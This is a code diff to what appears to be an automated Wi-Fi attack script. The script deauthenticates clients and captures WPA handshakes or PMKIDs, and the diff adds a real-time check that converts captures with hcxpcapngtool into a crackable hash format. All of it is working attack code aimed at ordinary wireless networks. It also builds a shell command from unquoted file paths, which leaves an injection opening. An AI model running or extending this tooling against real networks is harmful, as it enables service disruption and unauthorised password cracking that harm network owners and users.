@@ -11,7 +11,10 @@ from collections import deque
 
 # Import Python deauth module (graceful fallback if not available)
 try:
-    from deauth import send_deauth_packets
+    try:
+        from app.deauth import send_deauth_packets
+    except ImportError:
+        from deauth import send_deauth_packets
     PYTHON_DEAUTH_AVAILABLE = True
 except ImportError:
     PYTHON_DEAUTH_AVAILABLE = False
@@ -616,6 +619,30 @@ def get_all_stations_by_bssid(csv_file):
     
     return stations_map
 
+def check_handshake_in_cap(cap_file):
+    """
+    Check if a .cap file contains a valid handshake or PMKID.
+    Uses hcxpcapngtool on a temporary file to verify content.
+    """
+    tmp_hash = f"{cap_file}.tmp_check.hc22000"
+    try:
+        # Run conversion
+        subprocess.run(
+            f"hcxpcapngtool -o {tmp_hash} {cap_file} 2>/dev/null",
+            shell=True,
+            capture_output=True,
+            timeout=5
+        )
+        # If hash file exists and has content, we have a handshake
+        if os.path.exists(tmp_hash) and os.path.getsize(tmp_hash) > 0:
+            return True
+    except:
+        pass
+    finally:
+        if os.path.exists(tmp_hash):
+            os.remove(tmp_hash)
+    return False
+
 def capture_handshake(mon_interface, network, current=None, total=None):
     """Deauth and capture handshake for a specific network
     
@@ -1003,24 +1030,43 @@ def capture_handshake(mon_interface, network, current=None, total=None):
         # Deauth was sent - wait for clients to reconnect and complete handshake
         print(f"[+] Deauth phase complete")
         if stations:
-            print(f"[*] Waiting 25s for {len(stations)} client(s) to reconnect and complete 4-way handshake...")
+            print(f"[*] Max wait 25s for {len(stations)} client(s) to reconnect and complete 4-way handshake...")
             wait_time = 25
         else:
-            print(f"[*] Waiting 20s for hidden clients to reconnect (if any exist)...")
+            print(f"[*] Max wait 20s for hidden clients to reconnect (if any exist)...")
             wait_time = 20
     else:
         # Deauth failed
         if stations:
             # Had clients but deauth failed - still wait for passive handshake
-            print(f"[!] Deauth failed - waiting 15s for passive handshake...")
+            print(f"[!] Deauth failed - max wait 15s for passive handshake...")
             wait_time = 15
         else:
             # No clients and deauth failed - short wait for PMKID only
-            print(f"[*] Deauth failed - waiting 10s for PMKID...")
+            print(f"[*] Deauth failed - max wait 10s for PMKID...")
             wait_time = 10
+
+    # Monitor capture in real-time instead of fixed wait
+    print(f"[*] Starting real-time handshake monitor...")
+    start_time = time.time()
+    found_handshake = False
     
-    # Increased wait time for complete 4-way handshake (clients need time to fully reconnect)
-    time.sleep(wait_time)
+    while (time.time() - start_time) < wait_time:
+        if graceful_shutdown:
+            print(f"[!] Stop requested, aborting monitor")
+            break
+            
+        if check_handshake_in_cap(cap_file):
+            print(f"\n[+] INSTANT WIN: Valid handshake/PMKID detected in {int(time.time() - start_time)}s!")
+            found_handshake = True
+            break
+            
+        # Give some visual feedback
+        elapsed = int(time.time() - start_time)
+        print(f"\r[*] Capturing... {elapsed}/{wait_time}s (Press CTRL+C to skip)", end="", flush=True)
+        time.sleep(1)
+    
+    print("\n" if not found_handshake else "", end="")
     
     # Send SIGTERM to allow graceful shutdown and buffer flush
     print(f"[*] Stopping capture (allowing buffer flush)...")
